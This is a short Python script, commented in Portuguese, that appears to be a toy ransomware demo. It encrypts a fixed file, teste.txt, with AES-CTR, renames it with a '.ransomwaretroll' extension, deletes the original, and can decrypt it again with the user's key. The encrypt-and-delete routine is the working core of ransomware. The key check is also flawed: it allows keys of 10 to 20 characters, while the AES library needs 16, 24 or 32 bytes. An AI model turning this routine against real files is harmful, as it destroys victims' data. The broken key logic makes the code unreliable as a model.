import os
import pyaes

# Nome do arquivo
file_name = "teste.txt"
encrypted_file_name = file_name + ".ransomwaretroll"

def encrypt_file(key):
    """Função para criptografar o arquivo."""
    if os.path.exists(file_name):
        # Abrir o arquivo original
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Criptografar os dados
        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        # Salvar o arquivo criptografado
        with open(encrypted_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        # Remover o arquivo original
        os.remove(file_name)
        print(f"Arquivo {file_name} foi criptografado para {encrypted_file_name}.")
    else:
        print(f"O arquivo {file_name} não existe para criptografar.")

def decrypt_file(key):
    """Função para descriptografar o arquivo."""
    if os.path.exists(encrypted_file_name):
        # Abrir o arquivo criptografado
        with open(encrypted_file_name, "rb") as file:
            file_data = file.read()

        # Descriptografar os dados
        aes = pyaes.AESModeOfOperationCTR(key)
        decrypt_data = aes.decrypt(file_data)

        # Salvar o arquivo descriptografado
        with open(file_name, "wb") as new_file:
            new_file.write(decrypt_data)

        # Remover o arquivo criptografado
        os.remove(encrypted_file_name)
        print(f"Arquivo {encrypted_file_name} foi descriptografado para {file_name}.")
    else:
        print(f"O arquivo {encrypted_file_name} não existe para descriptografar.")

if __name__ == "__main__":
    print("Selecione uma opção:")
    print("1. Criptografar o arquivo")
    print("2. Descriptografar o arquivo")
    choice = input("Escolha (1/2): ")

    # Entrada da chave de criptografia
    user_key = input("Insira a chave de criptografia/descriptografia (entre 10 e 20 caracteres): ").encode()

    if not (10 <= len(user_key) <= 20):
        print("Erro: A chave deve ter entre 10 e 20 caracteres.")
    else:
        if choice == "1":
            encrypt_file(user_key)
        elif choice == "2":
            decrypt_file(user_key)
        else:
            print("Opção inválida. Encerrando o script.")
